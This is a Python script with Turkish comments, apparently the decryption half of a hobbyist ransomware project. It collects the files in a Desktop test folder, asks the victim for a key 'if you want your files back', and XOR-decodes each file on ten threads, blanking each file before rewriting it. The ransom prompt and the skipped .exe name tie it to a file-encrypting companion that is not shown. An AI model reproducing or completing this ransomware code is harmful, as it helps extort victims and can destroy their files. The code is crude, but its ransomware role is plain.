import os
import threading
import queue


def decrypt(key):
    while True:
        file=q.get()
        print("Decryption {}".format(file))
        try:
            key_index=0
            max_key_index=len(key)-1
            encrypted_data=""
            with open(file,"rb") as f:
                data=f.read()

            # Dosya içeriğini sıfırlama
            with open(file,"w") as f:
                f.write("")

            # Şifreyi çözmeye başlama
            decrypted_data=bytearray()
            for byte in data:
                xor_byte=byte^ord(key[key_index])
                decrypted_data.append(xor_byte)

                if key_index>=max_key_index:
                    key_index=0
                else:
                    key_index+=1

            # Şifre çözülmüş veriyi dosyaya yazma
            with open(file,"wb") as f:
                f.write(decrypted_data)

            print("{} succesfully decrypted!!!".format(file))
        except:
            print("Failed to decrypt file")
        q.task_done()


# şifreleme bilgileri
ENCRYPTION_LEVEL = 512 // 8  #64 bytes
key_char_pool = "qwertyuopasdfghjklizxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM<>!'?.,/;[]{}|"
key_char_pool_len = len(key_char_pool)


# filepathleri şifre çözmek için buluyoruz
print("Preparing files...")
desktop_path = os.environ["USERPROFILE"]+"\\Desktop"+"\\DENEMELER"
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile("{}\\{}".format(desktop_path, f)) and f != __file__[:-2]+'exe':
        abs_files.append("{}\\{}".format(desktop_path, f))
print("succesfully located all files!")



key = input("Please enter the decryption key if you want your files back: ")

#thread oluşturmamız için queue oluşturma
q=queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decrypt,args=(key,),daemon=True)
    t.start()

q.join()
input()
print("Decryption is complated!!!")
